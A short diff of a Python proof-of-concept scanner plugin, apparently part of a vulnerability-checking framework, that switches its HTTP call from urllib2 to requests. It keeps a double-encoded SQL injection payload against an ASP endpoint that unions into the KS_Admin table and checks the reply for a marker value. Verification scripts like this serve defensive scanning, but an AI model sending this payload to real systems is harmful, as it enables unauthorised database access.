@@ -35,9 +35,8 @@ class Poc(ABPoc):
             payload = "/plus/Ajaxs.asp?action=GetRelativeItem&Key=goingta%2525%2527%2529%2520%2575%256E%2569%256F%256E%2520%2573%2565%256C%2565%2563%2574%25201,2,6666123%252b777700%252b9%20from%20KS_Admin%2500"
             verify_url = self.target + payload
 
-            req = urllib2.Request(verify_url)
-            content = urllib2.urlopen(req).read()
-            if req.getcode() == 200 and "7443832" in content:
+            req = requests.get(verify_url)
+            if req.status_code == 200 and "7443832" in req.text:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
